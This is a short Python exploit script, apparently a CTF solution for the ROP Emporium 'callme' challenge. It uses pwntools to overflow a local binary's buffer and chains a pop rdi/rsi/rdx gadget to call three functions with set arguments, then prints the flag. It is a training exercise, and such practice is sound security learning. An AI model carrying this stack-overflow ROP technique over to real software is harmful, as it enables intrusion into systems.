from pwn import *

elf = ELF('callme')                             #context.binary

p = process(elf.path)

#Prepare the payload
junk = b"A"*40                                  #creates the junk part of the payload
arg0 = p64(0xdeadbeefdeadbeef)                  
arg1 = p64(0xcafebabecafebabe)                  
arg2 = p64(0xd00df00dd00df00d)                  

callme_one = p64(0x400720)                      #address of callme_one
callme_two = p64(0x400740)                      #address of callme_two
callme_three = p64(0x4006f0)                    #address of callme_three  

pop_rdi_rsi_rdx_ret = p64(0x40093c)             #address of pop rdi ; pop rsi ; pop rdx ; ret

get_args = pop_rdi_rsi_rdx_ret + arg0 + arg1 + arg2

payload = junk + get_args + callme_one + get_args + callme_two + get_args + callme_three

# Send the payload

p.sendline(payload)                             #send the payload to the process

response = p.recvall()                          #gets all messages in the process

print(response.decode())
#print(re.search("(ROPE{.*?})",response.decode()))